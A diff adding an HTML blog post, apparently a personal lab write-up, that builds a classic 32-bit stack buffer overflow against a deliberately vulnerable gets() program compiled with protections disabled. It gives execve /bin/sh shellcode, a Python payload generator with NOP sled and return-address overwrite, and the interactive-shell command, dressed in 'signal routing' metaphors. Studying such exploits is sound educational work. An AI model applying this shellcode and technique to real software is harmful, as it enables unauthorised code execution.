@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Signal Routing in Stack-Based Systems</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+</head>
+<body>
+  <div class="container">
+    <h1>📡 Signal Routing in Stack-Based Systems</h1>
+    <p><strong>Date:</strong> August 12th, 2025<br>
+       <strong>Topic:</strong> Memory Flow, Execution Hijacking, Stack Logic<br>
+       <strong>Summary:</strong> Directing control signals within executable memory via stack-based shellcode injection — modeling triggerable memory landscapes.
+    </p>
+    <hr>
+
+    <h2>🔍 Concept</h2>
+    <p>Imagine a stream of signal instructions, loaded into memory, waiting for the correct pointer to activate them. This entry explores how signal execution can be redirected by carefully structuring memory layouts — specifically via stack-injected payloads in x86 programs. Though rooted in low-level C exploitation, this also models dynamic flow-routing in system architectures or even programmable matter concepts.</p>
+
+    <hr>
+
+    <h2>📄 The Program Under Study</h2>
+    <p>Here’s the minimal vulnerable structure — a C program with an unbounded input call:</p>
+<pre><code class="language-c">void vulnerable() {
+    char buffer[100];
+    gets(buffer); // intentionally unsafe
+}</code></pre>
+    <p>Compiled with mitigations disabled:</p>
+<pre><code class="language-bash">gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln</code></pre>
+
+    <hr>
+
+    <h2>🧠 Memory Model</h2>
+    <p>We built and injected the following layout:</p>
+<pre><code class="language-text">[ Payload Layout ]
+
+|---------------------------|  ← esp
+|  NOP sled (padding)       |
+|---------------------------|
+|  Shellcode (execve)       |
+|---------------------------|
+|  EIP overwrite → ↴        |
+|   return into NOP sled    |
+|---------------------------|</code></pre>
+    <p>The EIP (Instruction Pointer) is overwritten to aim into the NOP sled. Execution slides into our shellcode seamlessly.</p>
+
+    <hr>
+
+    <h2>⚙️ Payload Generation</h2>
+<pre><code class="language-python">import struct, sys
+
+shellcode = (
+  b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+  b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+  b"\x53\x89\xe1\xb0\x0b\xcd\x80"
+)
+
+offset = 129
+ret_addr = 0xffffce7f
+payload = b"\x90" * (offset - len(shellcode)) + shellcode
+payload += struct.pack("&lt;I", ret_addr)
+
+sys.stdout.buffer.write(payload)</code></pre>
+
+    <p>To preserve interactivity:</p>
+<pre><code class="language-bash">(cat input.txt; cat) | ./vuln</code></pre>
+
+    <hr>
+
+    <h2>🔬 Diagnostics & Refinement</h2>
+    <ul>
+      <li>🧪 Used <code>msf-pattern_create</code> to confirm offset at byte 129</li>
+      <li>🔍 Observed shellcode in stack at <code>0xffffce7f</code> via GDB</li>
+      <li>🔄 Adjusted EIP repeatedly (fuzzed nearby offsets)</li>
+      <li>🧩 Added NOP sled to allow flexible landing zone</li>
+    </ul>
+
+    <hr>
+
+    <h2>🧬 Biological Parallel</h2>
+    <p>Signal molecules often rely on spatial location and timing to trigger downstream processes. This exploit mimics that — building a latent chain of actions in memory, inert until a pointer activates it. Think of it as creating a resonant structure that only responds to the right frequency — in this case, the EIP register.</p>
+
+    <blockquote>
+      “The stack becomes a staging ground for latent behavior. EIP is the tuning fork.”
+    </blockquote>
+
+    <hr>
+
+    <h2>✅ Lessons & Outcomes</h2>
+    <ul>
+      <li>Control flow is about location + timing</li>
+      <li>Memory permission flags (NX, PIE, etc.) shape viability of transformation</li>
+      <li>Silent failures (no crash) often mean signal was lost — not rejected</li>
+      <li>Interactivity (stdin) must be accounted for in downstream systems</li>
+    </ul>
+
+    <hr>
+    <p><em>Filed as part of the broader study into signal landscapes and memory-driven computation.</em></p>
+    <p><a href="../posts.html">⬅ Back to Posts</a></p>
+  </div>
+
+  <button id="mode-toggle">🌙</button>
+  <script src="../assets/js/darkmode.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</body>
+</html>
